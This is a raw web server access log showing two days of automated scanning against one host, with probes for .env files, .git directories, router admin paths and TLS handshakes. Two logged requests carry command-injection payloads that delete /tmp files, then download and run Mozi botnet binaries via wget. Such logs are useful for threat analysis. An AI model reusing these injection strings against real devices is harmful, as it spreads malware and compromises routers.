87.120.115.119 - - [17/Jan/2025:11:03:34 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900H Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
46.19.138.234 - - [17/Jan/2025:11:12:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
146.19.24.168 - - [17/Jan/2025:11:13:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.168 - - [17/Jan/2025:12:08:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [17/Jan/2025:12:13:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:12:13:58 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.162.71.210 - - [17/Jan/2025:12:49:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
141.98.10.115 - - [17/Jan/2025:12:49:49 +0000] "GET / HTTP/1.1" 200 966 "-" "Linux Gnu (cow)"
139.59.101.104 - - [17/Jan/2025:13:33:54 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
5.181.190.248 - - [17/Jan/2025:14:13:12 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [17/Jan/2025:14:13:12 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.148 - - [17/Jan/2025:14:24:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:14:24:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
34.77.127.183 - - [17/Jan/2025:15:19:34 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
141.98.10.115 - - [17/Jan/2025:16:00:10 +0000] "GET / HTTP/1.1" 200 966 "-" "Linux Gnu (cow)"
78.153.140.148 - - [17/Jan/2025:16:20:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:16:20:24 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
167.172.90.143 - - [17/Jan/2025:17:06:08 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [17/Jan/2025:17:06:19 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.172.90.143 - - [17/Jan/2025:17:14:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [17/Jan/2025:17:14:13 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
78.153.140.148 - - [17/Jan/2025:17:18:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:17:18:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
206.189.152.11 - - [17/Jan/2025:17:19:05 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [17/Jan/2025:17:19:14 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
206.189.152.11 - - [17/Jan/2025:17:19:43 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [17/Jan/2025:17:19:54 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
179.43.191.146 - - [17/Jan/2025:17:23:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [17/Jan/2025:17:26:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.70.133 - - [17/Jan/2025:17:58:05 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 8.0.0; moto e5 cruise Build/OCPS27.91-157-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36"
183.60.226.87 - - [17/Jan/2025:18:29:15 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
80.82.77.202 - - [17/Jan/2025:18:30:46 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
95.214.55.185 - - [17/Jan/2025:18:58:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [17/Jan/2025:19:09:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [17/Jan/2025:19:13:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:19:13:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
146.19.24.168 - - [17/Jan/2025:19:18:03 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [17/Jan/2025:19:37:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [17/Jan/2025:20:06:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [17/Jan/2025:20:06:52 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.148 - - [17/Jan/2025:20:46:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:20:46:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [17/Jan/2025:20:47:41 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
78.153.140.148 - - [17/Jan/2025:21:16:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:21:16:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
104.152.52.38 - - [17/Jan/2025:21:20:43 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
104.152.52.38 - - [17/Jan/2025:21:20:44 +0000] "GET /nmaplowercheck1737148843 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.38 - - [17/Jan/2025:21:20:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
104.152.52.38 - - [17/Jan/2025:21:20:44 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.38 - - [17/Jan/2025:21:20:44 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.38 - - [17/Jan/2025:21:20:44 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.38 - - [17/Jan/2025:21:20:45 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.38 - - [17/Jan/2025:21:20:45 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
104.152.52.38 - - [17/Jan/2025:21:20:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
103.171.163.130 - - [17/Jan/2025:21:27:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
83.239.18.110 - - [17/Jan/2025:21:39:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
102.131.60.115 - - [17/Jan/2025:21:48:51 +0000] "GET /admin/config.php HTTP/1.0" 302 350 "-" "xfa1"
178.215.236.132 - - [17/Jan/2025:21:49:54 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Offline Explorer/2.5"
147.185.132.150 - - [17/Jan/2025:21:51:09 +0000] "\x16\x03\x01" 400 524 "-" "-"
147.185.132.150 - - [17/Jan/2025:21:51:10 +0000] "\x16\x03\x01" 400 524 "-" "-"
185.196.220.253 - - [17/Jan/2025:21:54:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
73.69.11.243 - - [17/Jan/2025:22:01:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
119.136.152.186 - - [17/Jan/2025:22:20:31 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://119.136.152.186:54451/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 302 387 "-" "Hello, world"
46.19.138.234 - - [17/Jan/2025:22:49:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [17/Jan/2025:23:25:32 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:23:25:32 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
146.19.24.18 - - [17/Jan/2025:23:36:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.143 - - [17/Jan/2025:23:40:39 +0000] "\x16\x03\x01" 400 524 "-" "-"
198.235.24.143 - - [17/Jan/2025:23:40:39 +0000] "\x16\x03\x01" 400 524 "-" "-"
146.19.24.168 - - [17/Jan/2025:23:55:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [16/Jan/2025:00:00:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:00:00:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
116.58.78.122 - - [16/Jan/2025:00:07:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
206.168.34.94 - - [16/Jan/2025:00:19:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.94 - - [16/Jan/2025:00:19:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.94 - - [16/Jan/2025:00:19:45 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.94 - - [16/Jan/2025:00:19:47 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.94 - - [16/Jan/2025:00:19:49 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
147.185.133.73 - - [16/Jan/2025:00:20:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
105.112.234.136 - - [16/Jan/2025:00:27:58 +0000] "GET //.env HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
105.112.234.136 - - [16/Jan/2025:00:27:59 +0000] "GET / HTTP/1.1" 200 947 "http://34.93.54.196//.env" "Go-http-client/1.1"
178.215.236.132 - - [16/Jan/2025:00:46:35 +0000] "GET /.git/index HTTP/1.1" 302 350 "-" "Wget/1.12 (freebsd8.1)"
165.22.18.246 - - [16/Jan/2025:00:58:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible)"
165.22.18.246 - - [16/Jan/2025:00:58:02 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "http://34.93.54.196/" "Mozilla/5.0 (compatible)"
80.82.77.202 - - [16/Jan/2025:00:59:52 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
78.153.140.148 - - [16/Jan/2025:01:17:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:01:17:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
57.128.229.1 - - [16/Jan/2025:01:34:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
57.128.229.1 - - [16/Jan/2025:01:34:15 +0000] "GET /js/brand.js HTTP/1.1" 200 570 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
57.128.229.1 - - [16/Jan/2025:01:34:15 +0000] "GET /js/login.js HTTP/1.1" 200 922 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
86.141.160.157 - - [16/Jan/2025:01:52:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [16/Jan/2025:01:54:10 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:01:54:10 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
92.255.57.58 - - [16/Jan/2025:02:04:58 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.185.132.64 - - [16/Jan/2025:02:17:29 +0000] "\x16\x03\x01" 400 524 "-" "-"
147.185.132.64 - - [16/Jan/2025:02:17:30 +0000] "\x16\x03\x01" 400 524 "-" "-"
1.176.171.127 - - [16/Jan/2025:02:19:14 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
4.151.38.0 - - [16/Jan/2025:02:22:36 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
46.19.138.234 - - [16/Jan/2025:02:40:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [16/Jan/2025:02:45:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:02:45:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
24.187.102.81 - - [16/Jan/2025:03:29:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [16/Jan/2025:03:31:05 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [16/Jan/2025:03:31:06 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.191.146 - - [16/Jan/2025:03:53:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [16/Jan/2025:03:57:40 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
5.181.190.248 - - [16/Jan/2025:03:59:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:03:59:03 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
110.41.184.245 - - [16/Jan/2025:04:23:24 +0000] "GET /stalker_portal/c/xpcom.common.js HTTP/1.1\n" 400 524 "-" "-"
95.214.55.226 - - [16/Jan/2025:04:38:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.82.70.133 - - [16/Jan/2025:04:40:07 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
78.153.140.148 - - [16/Jan/2025:05:05:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:05:05:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.236.176.243 - - [16/Jan/2025:06:04:04 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
205.210.31.8 - - [16/Jan/2025:06:35:27 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.8 - - [16/Jan/2025:06:35:27 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.148 - - [16/Jan/2025:06:44:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:06:44:59 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
60.46.231.218 - - [16/Jan/2025:06:55:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [16/Jan/2025:06:57:47 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:06:57:48 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
95.214.55.226 - - [16/Jan/2025:07:44:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
35.189.226.226 - - [16/Jan/2025:07:51:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
47.91.91.123 - - [16/Jan/2025:08:11:45 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.148 - - [16/Jan/2025:08:27:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:08:27:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:08:35:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.197.172 - - [16/Jan/2025:09:16:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
64.62.197.180 - - [16/Jan/2025:09:18:04 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
64.62.197.175 - - [16/Jan/2025:09:18:38 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
178.215.236.132 - - [16/Jan/2025:09:26:30 +0000] "GET /.git/HEAD HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.75 Chrome/68.0.3440.75 Safari/537.36"
104.152.52.150 - - [16/Jan/2025:09:54:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
104.152.52.150 - - [16/Jan/2025:09:54:33 +0000] "GET /nmaplowercheck1737021273 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.150 - - [16/Jan/2025:09:54:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
104.152.52.150 - - [16/Jan/2025:09:54:33 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.150 - - [16/Jan/2025:09:54:34 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.150 - - [16/Jan/2025:09:54:34 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.150 - - [16/Jan/2025:09:54:34 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.150 - - [16/Jan/2025:09:54:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
104.152.52.150 - - [16/Jan/2025:09:54:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [16/Jan/2025:09:57:56 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:09:57:57 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.148 - - [16/Jan/2025:09:59:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:09:59:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
206.189.152.11 - - [16/Jan/2025:10:50:41 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [16/Jan/2025:10:50:51 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
78.153.140.148 - - [16/Jan/2025:10:54:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:10:54:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
167.172.90.143 - - [16/Jan/2025:10:58:36 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [16/Jan/2025:10:58:44 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.172.72.201 - - [16/Jan/2025:11:03:25 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [16/Jan/2025:11:03:34 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.99.67.123 - - [16/Jan/2025:11:03:55 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
179.43.191.146 - - [16/Jan/2025:11:03:59 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.99.67.123 - - [16/Jan/2025:11:04:09 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
